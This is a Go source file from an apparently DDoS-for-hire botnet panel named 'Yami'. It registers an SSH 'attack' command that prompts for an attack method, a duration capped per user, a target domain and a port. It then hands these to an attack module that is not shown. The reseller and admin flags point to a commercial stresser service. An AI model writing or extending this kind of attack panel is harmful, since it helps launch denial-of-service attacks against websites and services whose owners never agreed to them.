package commands

import (
	"Yami/core/attacks-v2"

	Sessions "Yami/core/clients/session"

	"strconv"
	"strings"

	"golang.org/x/crypto/ssh"
	"golang.org/x/crypto/ssh/terminal"
)

// clear command
func init() {
	Register(&Command{
		Name: "attack",
		Admin: false,
		Reseller: false,

		Descriptions: "Launch an attack with Help!",
		Execute: func(channel ssh.Channel, sshConn *ssh.ServerConn, Session *Sessions.Session, cmd []string) error {



			MethodTerm := terminal.NewTerminal(channel, "Method>")
			Method, error := MethodTerm.ReadLine(); if error != nil {
				channel.Write([]byte("\r\n"))
				return nil
			}


			TimeTerm := terminal.NewTerminal(channel, "Time (Max "+strconv.Itoa(Session.User.MaxTime)+")>")
			AttackTime, error := TimeTerm.ReadLine(); if error != nil {
				channel.Write([]byte("\r\n"))
				return nil
			}

			_ = AttackTime

			TargetTerm := terminal.NewTerminal(channel, "Target (Domains Supported)>")
			Target, error := TargetTerm.ReadLine(); if error != nil {
				channel.Write([]byte("\r\n"))
				return nil
			}

			PortTerm := terminal.NewTerminal(channel, "Port>")
			Port, error := PortTerm.ReadLine(); if error != nil {
				channel.Write([]byte("\r\n"))
				return nil
			}

			Method = strings.ToLower(Method)

			var DPort bool

			if Port == "" {
				DPort = true
			} else {
				DPort = false
			}


			AttacksV2.NewAttack(channel, sshConn, Target, Port, AttackTime, Method, DPort)

			return nil
		},
	})
}